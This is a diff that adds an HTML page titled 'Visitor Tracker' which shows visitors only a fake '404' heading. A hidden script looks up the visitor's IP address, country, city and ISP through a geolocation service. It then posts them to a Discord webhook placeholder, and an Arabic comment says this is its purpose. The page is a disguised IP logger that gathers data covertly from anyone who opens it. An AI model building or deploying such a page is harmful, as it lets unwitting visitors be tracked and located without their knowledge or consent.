@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>Visitor Tracker</title>
+</head>
+<body>
+<h1>404</h1>
+<script>
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+    // ارسال لديسكورد ويبهوك
+    fetch("WEBHOOK_URL", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            content:
+`📥 New Visitor
+🌐 IP: ${data.ip}
+🏳️ Country: ${data.country_name}
+🏙️ City: ${data.city}
+🏢 ISP: ${data.org}
+🕒 Time: ${new Date().toLocaleString()}`
+        })
+    });
+});
+</script>
+</body>
+</html>
